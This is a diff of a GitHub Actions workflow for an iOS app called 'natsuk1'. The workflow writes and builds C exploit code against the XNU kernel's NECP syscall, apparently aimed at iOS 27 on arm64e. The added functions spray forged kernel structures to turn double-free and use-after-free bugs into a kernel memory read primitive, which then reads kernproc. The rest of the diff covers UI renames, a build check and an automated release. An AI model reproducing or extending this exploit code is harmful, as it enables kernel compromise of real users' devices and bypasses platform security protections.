@@ -34,8 +34,8 @@ jobs:
         run: |
           set -euo pipefail
           test -f natsuk1/Helpers/CrashLog.swift
-          test -f natsuk1/Views/RuntimeView.swift
           test -f natsuk1/Views/CrashLogView.swift
+          test -f natsuk1/Views/RuntimeView.swift
           grep -q 'natsuk1-crashlog-v1' natsuk1/natsuk1.swift
           echo "pre-existing OK"
 
@@ -63,7 +63,7 @@ jobs:
                               }
                               .disabled(state.running)
                           } header: {
-                              Label("Kernel Read Write", systemImage: "cpu")
+                              Label("Exploit", systemImage: "cpu")
                           }
 
                           RuntimeView()
@@ -125,6 +125,80 @@ jobs:
               }
           }
           SWIFT
+
+      - name: Write RuntimeView.swift
+        run: |
+          cat > natsuk1/Views/RuntimeView.swift <<'SWIFT'
+          import SwiftUI
+          import UIKit
+
+          struct RuntimeView: View {
+              @EnvironmentObject var state: AppState
+
+              var body: some View {
+                  Section {
+                      row("Slide", state.slide, hot: state.slide != "—")
+                      row("Base",  state.base,  hot: state.base  != "—")
+                      HStack {
+                          Text("Status")
+                          Spacer()
+                          StatusDot(status: state.status)
+                      }
+                  } header: {
+                      Label("Runtime", systemImage: "waveform.path.ecg")
+                  }
+              }
+
+              private func row(_ k: String, _ v: String, hot: Bool) -> some View {
+                  HStack {
+                      Text(k)
+                      Spacer()
+                      Text(v)
+                          .font(.system(size: 13, design: .monospaced))
+                          .foregroundStyle(hot ? Color.green : Color.secondary)
+                          .lineLimit(1)
+                          .truncationMode(.middle)
+                  }
+              }
+          }
+          SWIFT
+
+      - name: Remove crash sheet from natsuk1.swift
+        run: |
+          set -euo pipefail
+          python3 - <<'PYEOF'
+          import re
+          import sys
+
+          P = "natsuk1/natsuk1.swift"
+          with open(P) as f:
+              s = f.read()
+
+          if "natsuk1-no-crashui" in s:
+              print("already removed")
+              sys.exit(0)
+
+          pat = re.compile(
+              r"\.sheet\(isPresented: \$state\.showCrashLog\)\s*\{[^}]*\}",
+              re.DOTALL)
+
+          matches = pat.findall(s)
+          print("sheet matches: %d" % len(matches))
+          if len(matches) != 1:
+              print("FAIL: expected 1 sheet, got %d" % len(matches))
+              sys.exit(1)
+
+          s = pat.sub("/* natsuk1-no-crashui */", s, count=1)
+
+          if "natsuk1-no-crashui" not in s:
+              sys.exit("FAIL: marker missing")
+          if "CrashLogView().environmentObject" in s:
+              sys.exit("FAIL: CrashLogView still present")
+
+          with open(P, "w") as f:
+              f.write(s)
+          print("natsuk1.swift: sheet removed")
+          PYEOF
 
       - name: Write necp.c
         run: |
@@ -370,76 +444,6 @@ jobs:
               close(fd);
           }
 
-          static void p_copy_sizes(void) {
-              static const int sizes[] = { 1, 8, 32, 128, 256, 1024, 4096, 16384 };
-              LI("CPY", "size sweep");
-              int fd = nfd();
-              if (fd < 0) { LE("CPY", "open errno=%d", errno); return; }
-              uint8_t cu[16], fu[16];
-              if (nadd_client(fd, cu) != 0 || nadd_flow(fd, cu, fu) != 0) {
-                  LE("CPY", "setup errno=%d", errno); close(fd); return;
-              }
-              nrm_flow(fd, fu);
-              uint8_t buf[RESBUF];
-              for (unsigned i = 0; i < sizeof(sizes)/sizeof(sizes[0]); i++) {
-                  memset(buf, 0, sizes[i]);
-                  errno = 0;
-                  int r = ncpy(fd, cu, buf, (size_t)sizes[i]);
-                  LI("CPY", "size=%d ret=%d errno=%d", sizes[i], r, errno);
-                  if (r > 0) dumpw("CPY", buf, r / 8 > 8 ? 8 : r / 8);
-              }
-              close(fd);
-          }
-
-          static void p_tlv_overflow(void) {
-              LI("TLV", "ADD_FLOW variable size");
-              int fd = nfd();
-              if (fd < 0) { LE("TLV", "open errno=%d", errno); return; }
-              uint8_t cu[16];
-              if (nadd_client(fd, cu) != 0) { LE("TLV", "ac errno=%d", errno); close(fd); return; }
-              static const int sizes[] = { 16, 32, 56, 128, 512, 1024, 2048 };
-              for (unsigned i = 0; i < sizeof(sizes)/sizeof(sizes[0]); i++) {
-                  int n = sizes[i];
-                  uint8_t *req = calloc(1, (size_t)n);
-                  if (!req) continue;
-                  if (n >= 0x20) memcpy(req + 0x10, cu, 16);
-                  if (n >= 0x22) *(uint16_t*)(req + 0x20) = 0x0040;
-                  if (n >= 0x2c) {
-                      *(uint16_t*)(req + 0x28) = 0x0001;
-                      *(uint16_t*)(req + 0x2a) = (uint16_t)(n - 0x2c);
-                  }
-                  errno = 0;
-                  int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
-                                       (void*)cu, (size_t)16, req, (size_t)n);
-                  LI("TLV", "n=%d ret=%d errno=%d", n, r, errno);
-                  free(req);
-                  usleep(30);
-              }
-              close(fd);
-          }
-
-          static void p_mass_flows(void) {
-              LI("MASS", "create N then mass-remove");
-              int fd = nfd();
-              if (fd < 0) { LE("MASS", "open errno=%d", errno); return; }
-              uint8_t cu[16];
-              if (nadd_client(fd, cu) != 0) { LE("MASS", "ac errno=%d", errno); close(fd); return; }
-              enum { N = 32 };
-              uint8_t fus[N][16];
-              int created = 0;
-              for (int i = 0; i < N; i++) {
-                  if (nadd_flow(fd, cu, fus[i]) != 0) break;
-                  created++;
-              }
-              LI("MASS", "created=%d/%d", created, N);
-              int removed = 0;
-              for (int i = 0; i < created; i++) {
-                  if (nrm_flow(fd, fus[i]) == 0) removed++;
-              }
-              LI("MASS", "removed=%d", removed);
-              close(fd);
-          }
-
           static void p_crossop(void) {
               LI("XOP", "bogus uuid remove + copy");
               int fd = nfd();
@@ -458,23 +462,141 @@ jobs:
               close(fd);
           }
 
-          static void p_race_remove(void) {
-              LI("RACE", "spray while removing");
-              uint8_t fake[NCF_SZ];
-              memset(fake, 0x77, sizeof(fake));
-              *(uint64_t*)(fake + NCF_ASN) = 0x4141414141414141ULL;
-              spray_t sp;
-              spray_init(&sp, NPORTS);
+          /* p_phantom: spray between two removes of the same flow */
+          static void p_phantom(void) {
+              LI("PHANTOM", "add -> remove -> spray -> remove again");
               int fd = nfd();
-              if (fd < 0) { spray_drain(&sp); LE("RACE", "open errno=%d", errno); return; }
+              if (fd < 0) { LE("PHANTOM", "open errno=%d", errno); return; }
               uint8_t cu[16], fu[16];
               if (nadd_client(fd, cu) != 0 || nadd_flow(fd, cu, fu) != 0) {
-                  spray_drain(&sp); close(fd); return;
+                  LE("PHANTOM", "setup errno=%d", errno); close(fd); return;
               }
-              spray_send(&sp, fake, NCF_SZ);
+              int r1 = nrm_flow(fd, fu);
+              LI("PHANTOM", "rm1=%d", r1);
+
+              uint8_t fake[NCF_SZ];
+              memset(fake, 0x42, sizeof(fake));
+              *(uint64_t*)(fake + NCF_ASN) = 0xDEADBEEFCAFEBABEULL;
+              *(uint64_t*)(fake + NCF_LEN) = 0x100;
+              spray_t sp;
+              spray_init(&sp, NPORTS);
+              int nsp = spray_send(&sp, fake, NCF_SZ);
+              LI("PHANTOM", "sprayed=%d", nsp);
+              usleep(150);
+
               errno = 0;
-              int r = nrm_flow(fd, fu);
-              LI("RACE", "rm ret=%d errno=%d", r, errno);
+              int r2 = nrm_flow(fd, fu);
+              LI("PHANTOM", "rm2=%d errno=%d", r2, errno);
+
+              uint8_t buf[512];
+              memset(buf, 0, sizeof(buf));
+              errno = 0;
+              int c = ncpy(fd, cu, buf, sizeof(buf));
+              LI("PHANTOM", "copy ret=%d errno=%d", c, errno);
+              if (c > 0) dumpw("PHANTOM", buf, c / 8 > 10 ? 10 : c / 8);
+
+              spray_drain(&sp);
+              close(fd);
+          }
+
+          /* p_slotread: try to read sprayed content via reused slot */
+          static int p_slotread(uint64_t tgt) {
+              LI("SLOT", "try read via recycled flow slot (target=0x%llx)",
+                 (unsigned long long)tgt);
+              int fd = nfd();
+              if (fd < 0) { LE("SLOT", "open errno=%d", errno); return -1; }
+              uint8_t cu[16], fu1[16], fu2[16];
+              if (nadd_client(fd, cu) != 0) { LE("SLOT", "ac errno=%d", errno); close(fd); return -1; }
+              if (nadd_flow(fd, cu, fu1) != 0) { LE("SLOT", "af1 errno=%d", errno); close(fd); return -1; }
+              int r1 = nrm_flow(fd, fu1);
+              LI("SLOT", "free fu1 ret=%d", r1);
+
+              uint8_t fake[NCF_SZ];
+              memset(fake, 0x42, sizeof(fake));
+              *(uint64_t*)(fake + NCF_ASN) = tgt;
+              *(uint64_t*)(fake + NCF_LEN) = 8;
+              spray_t sp;
+              spray_init(&sp, NPORTS);
+              int nsp = spray_send(&sp, fake, NCF_SZ);
+              LI("SLOT", "sprayed=%d", nsp);
+              usleep(200);
+
+              int r2 = nadd_flow(fd, cu, fu2);
+              int same = (memcmp(fu1, fu2, 16) == 0);
+              LI("SLOT", "af2=%d same=%d", r2, same);
+
+              uint8_t buf[512];
+              memset(buf, 0, sizeof(buf));
+              errno = 0;
+              int c = ncpy(fd, cu, buf, sizeof(buf));
+              LI("SLOT", "copy ret=%d errno=%d", c, errno);
+
+              int found = -1;
+              if (c > 0) {
+                  dumpw("SLOT", buf, c / 8 > 12 ? 12 : c / 8);
+                  for (int i = 0; i + 8 <= c; i++) {
+                      uint64_t v;
+                      memcpy(&v, buf + i, 8);
+                      if (v == tgt) { found = i; break; }
+                  }
+              }
+              if (found >= 0) LO("SLOT", "HIT tgt at off=0x%x", found);
+
+              spray_drain(&sp);
+              close(fd);
+              return found;
+          }
+
+          /* p_refcount: repeated removes on same uuid */
+          static void p_refcount(void) {
+              LI("REFCNT", "remove same flow N times");
+              int fd = nfd();
+              if (fd < 0) { LE("REFCNT", "open errno=%d", errno); return; }
+              uint8_t cu[16], fu[16];
+              if (nadd_client(fd, cu) != 0 || nadd_flow(fd, cu, fu) != 0) {
+                  LE("REFCNT", "setup errno=%d", errno); close(fd); return;
+              }
+              for (int i = 0; i < 8; i++) {
+                  errno = 0;
+                  int r = nrm_flow(fd, fu);
+                  LI("REFCNT", "i=%d ret=%d errno=%d", i, r, errno);
+              }
+              uint8_t fu2[16];
+              errno = 0;
+              int a = nadd_flow(fd, cu, fu2);
+              LI("REFCNT", "re-add ret=%d errno=%d", a, errno);
+              close(fd);
+          }
+
+          /* p_client_uaf: try to reclaim client struct after op=0x02 */
+          static void p_client_uaf(void) {
+              LI("CUAF", "add_client -> op=0x02 -> spray -> copy");
+              int fd = nfd();
+              if (fd < 0) { LE("CUAF", "open errno=%d", errno); return; }
+              uint8_t cu[16];
+              if (nadd_client(fd, cu) != 0) { LE("CUAF", "ac errno=%d", errno); close(fd); return; }
+
+              errno = 0;
+              int rc = (int)syscall(SYS_NECP_ACTION, fd, 0x02,
+                                    (void*)cu, (size_t)16, NULL, (size_t)0);
+              LI("CUAF", "rm_client ret=%d errno=%d", rc, errno);
+
+              uint8_t fake[NCF_SZ];
+              memset(fake, 0x77, sizeof(fake));
+              *(uint64_t*)(fake + NCF_ASN) = 0xCAFEBABE12345678ULL;
+              spray_t sp;
+              spray_init(&sp, NPORTS);
+              int nsp = spray_send(&sp, fake, NCF_SZ);
+              LI("CUAF", "sprayed=%d", nsp);
+              usleep(200);
+
+              uint8_t buf[512];
+              memset(buf, 0, sizeof(buf));
+              errno = 0;
+              int c = ncpy(fd, cu, buf, sizeof(buf));
+              LI("CUAF", "copy ret=%d errno=%d", c, errno);
+              if (c > 0) dumpw("CUAF", buf, c / 8 > 10 ? 10 : c / 8);
+
               spray_drain(&sp);
               close(fd);
           }
@@ -517,25 +639,22 @@ jobs:
               LI("CAL", "kernproc@0x%llx expect=0x%llx",
                  (unsigned long long)OFF_KERNPROC, (unsigned long long)expect);
               uint8_t b[RESBUF];
-              for (int a = 0; a < 6; a++) {
+              for (int a = 0; a < 4; a++) {
                   errno = 0;
                   int r = trial(g_kbase + OFF_KERNPROC, 8,
                                 NCF_ASN, NCF_LEN, NCF_PAR, 0x42, b, sizeof(b));
-                  if (r <= 0) { LW("CAL", "a=%d ret=%d errno=%d", a, r, errno); usleep(400); continue; }
+                  if (r <= 0) { LW("CAL", "a=%d ret=%d errno=%d", a, r, errno); usleep(300); continue; }
                   LI("CAL", "a=%d ret=%d", a, r);
-                  dumpw("CAL", b, r / 8 > 16 ? 16 : r / 8);
                   for (int i = 0; i + 8 <= r; i++) {
                       uint64_t v;
                       memcpy(&v, b + i, 8);
                       if (is_kptr(v)) {
                           g_res_off = i;
-                          LO("CAL", "a=%d roff=0x%x val=0x%llx %s",
-                             a, i, (unsigned long long)v,
-                             v == expect ? "MATCH" : "kptr");
+                          LO("CAL", "a=%d roff=0x%x val=0x%llx", a, i, (unsigned long long)v);
                           return 0;
                       }
                   }
-                  usleep(400);
+                  usleep(300);
               }
               return -1;
           }
@@ -556,30 +675,11 @@ jobs:
 
           static uint32_t kr32(uint64_t addr) { return (uint32_t)(kr64(addr) & 0xFFFFFFFF); }
 
-          static int sanity(void) {
-              uint64_t kp = kr64(g_kbase + OFF_KERNPROC);
-              uint64_t tl = kr64(g_kbase + OFF_TASK_LIST);
-              LI("SAN", "kernproc=0x%llx task_list=0x%llx",
-                 (unsigned long long)kp, (unsigned long long)tl);
-              int ok = 0;
-              if (is_kptr(kp)) ok++;
-              if (is_kptr(tl)) ok++;
-              return ok == 2 ? 0 : -1;
-          }
-
-          static int task_sanity(void) {
-              uint64_t kp = kr64(g_kbase + OFF_KERNPROC);
-              if (!is_kptr(kp)) return -1;
-              uint32_t pid = kr32(kp + 0x74);
-              LI("TASK", "kernproc pid=%u (expect 0)", pid);
-              return pid == 0 ? 0 : -1;
-          }
-
           static volatile int g_busy = 0;
 
           static int impl(void) {
               nk_log("");
-              nk_log("=== natsuk1 v1.9 (natsuk1-probe-v9) ===");
+              nk_log("=== natsuk1 v2.0 (natsuk1-ddf-v10) ===");
               nk_log("target: iOS 27.0 / XNU / arm64e");
               nk_log("");
               LI("INIT", "NCF_SZ=0x%x NPORTS=%d PER=%d", NCF_SZ, NPORTS, PERPORT);
@@ -593,24 +693,32 @@ jobs:
                   LO("P2", "necp OK");
               }
 
-              LI("P3", "primitives");
-              p_sweep();
+              LI("P3", "primitives (double-free path)");
               p_double_free();
               p_reuse();
-              p_copy_sizes();
-              p_tlv_overflow();
-              p_mass_flows();
               p_crossop();
-              p_race_remove();
+              p_phantom();
+              p_refcount();
+              p_client_uaf();
 
-              LI("P4", "calibrate");
-              if (calibrate() != 0) { LE("P4", "failed"); return 1; }
-              LO("P4", "kread ready roff=0x%x", g_res_off);
+              LI("P4", "slot read test");
+              int hit = p_slotread(g_kbase + OFF_KERNPROC);
+              if (hit >= 0) {
+                  g_res_off = hit;
+                  LO("P4", "HIT off=0x%x - kread primitive works", hit);
+                  uint64_t kp = kr64(g_kbase + OFF_KERNPROC);
+                  LI("P5", "kernproc=0x%llx", (unsigned long long)kp);
+                  if (is_kptr(kp)) {
+                      uint32_t pid = kr32(kp + 0x74);
+                      LO("P5", "kernproc pid=%u", pid);
+                  }
+              } else {
+                  LE("P4", "no hit");
+                  LI("P5", "classic calibrate fallback");
+                  if (calibrate() == 0) LO("P5", "kread via classic path roff=0x%x", g_res_off);
+                  else LE("P5", "no kread");
+              }
 
-              LI("P5", "sanity");
-              if (sanity() != 0) { LE("P5", "sanity failed"); return 1; }
-              if (task_sanity() != 0) LW("P5", "task chain broken");
-              else LO("DONE", "kread complete");
               return 0;
           }
 
@@ -629,25 +737,36 @@ jobs:
         run: |
           set +e
           fail=0
-          F=natsuk1/Views/OverviewView.swift
-          N=natsuk1/Exploit/necp.c
-          echo "marker: $(grep -c 'natsuk1-probe-v9' "$N")"
-          test "$(grep -c 'natsuk1-probe-v9' "$N")" = "1" || fail=1
-          test "$(grep -c 'RuntimeView()' "$F")" = "1" || fail=1
-          test "$(grep -c 'struct StatusDot' "$F")" = "1" || fail=1
-          test "$(grep -c 'struct LogTerminal' "$F")" = "1" || fail=1
-          test "$(grep -c 'static void p_sweep(void)' "$N")" = "1" || fail=1
-          test "$(grep -c 'static void p_double_free(void)' "$N")" = "1" || fail=1
-          test "$(grep -c 'static void p_reuse(void)' "$N")" = "1" || fail=1
-          test "$(grep -c 'static void p_copy_sizes(void)' "$N")" = "1" || fail=1
-          test "$(grep -c 'static void p_tlv_overflow(void)' "$N")" = "1" || fail=1
-          test "$(grep -c 'static void p_mass_flows(void)' "$N")" = "1" || fail=1
-          test "$(grep -c 'static void p_crossop(void)' "$N")" = "1" || fail=1
-          test "$(grep -c 'static void p_race_remove(void)' "$N")" = "1" || fail=1
-          test "$(grep -c 'int nk_necp_run(void)' "$N")" = "1" || fail=1
+          O=natsuk1/Views/OverviewView.swift
+          R=natsuk1/Views/RuntimeView.swift
+          N=natsuk1/natsuk1.swift
+          C=natsuk1/Exploit/necp.c
+
+          grep -q 'Label("Exploit", systemImage: "cpu")' "$O" || { echo "FAIL: Exploit header"; fail=1; }
+          grep -q 'Kernel Read Write' "$O" && { echo "FAIL: old header"; fail=1; }
+          grep -q 'RuntimeView()' "$O" || { echo "FAIL: RuntimeView missing"; fail=1; }
+          grep -q 'struct StatusDot' "$O" || { echo "FAIL: StatusDot"; fail=1; }
+          grep -q 'struct LogTerminal' "$O" || { echo "FAIL: LogTerminal"; fail=1; }
+
+          grep -q 'row("Slide"' "$R" || { echo "FAIL: Slide"; fail=1; }
+          grep -q 'row("Base"'  "$R" || { echo "FAIL: Base"; fail=1; }
+          grep -q 'row("Device"' "$R" && { echo "FAIL: Device still present"; fail=1; }
+          grep -q 'previousCrash' "$R" && { echo "FAIL: crash footer"; fail=1; }
+
+          grep -q 'natsuk1-no-crashui' "$N" || { echo "FAIL: marker missing"; fail=1; }
+          grep -q 'CrashLogView().environmentObject' "$N" && { echo "FAIL: sheet still there"; fail=1; }
+
+          test "$(grep -c 'natsuk1-ddf-v10' "$C")" = "1" || { echo "FAIL: necp marker"; fail=1; }
+          test "$(grep -c 'static void p_phantom(void)' "$C")" = "1" || { echo "FAIL: p_phantom"; fail=1; }
+          test "$(grep -c 'static int p_slotread(uint64_t' "$C")" = "1" || { echo "FAIL: p_slotread"; fail=1; }
+          test "$(grep -c 'static void p_refcount(void)' "$C")" = "1" || { echo "FAIL: p_refcount"; fail=1; }
+          test "$(grep -c 'static void p_client_uaf(void)' "$C")" = "1" || { echo "FAIL: p_client_uaf"; fail=1; }
+          test "$(grep -c 'int nk_necp_run(void)' "$C")" = "1" || { echo "FAIL: nk_necp_run"; fail=1; }
+
           SDK=$(xcrun --sdk iphoneos --show-sdk-path)
           clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
-            -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$N" || fail=1
+            -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$C" || { echo "FAIL: syntax"; fail=1; }
+
           if [ "$fail" -ne 0 ]; then echo "VERIFY FAILED"; exit 1; fi
           echo "VERIFY OK"
 
@@ -699,14 +818,18 @@ jobs:
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "8 NECP primitives + UI order fix + marker dedup"
+            --notes "UI: Exploit header, Runtime clean. necp: double-free primitives."
 
       - name: Commit
         run: |
           set -euo pipefail
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-          git add natsuk1/Views/OverviewView.swift natsuk1/Exploit/necp.c
+          git add \
+            natsuk1/Views/OverviewView.swift \
+            natsuk1/Views/RuntimeView.swift \
+            natsuk1/natsuk1.swift \
+            natsuk1/Exploit/necp.c
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "8 NECP primitives + UI order [skip ci]"
+          git commit -m "UI cleanup + double-free primitives [skip ci]"
           git push
